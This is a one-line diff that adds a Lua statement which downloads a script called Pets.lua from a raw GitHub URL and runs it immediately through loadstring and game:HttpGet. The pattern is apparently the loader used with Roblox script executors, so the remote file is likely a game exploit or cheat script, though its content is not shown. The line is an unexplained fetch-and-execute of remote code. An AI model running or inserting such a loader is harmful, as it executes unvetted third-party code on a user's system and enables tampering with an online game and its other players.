@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/SecretService/main/Pets.lua", true))()
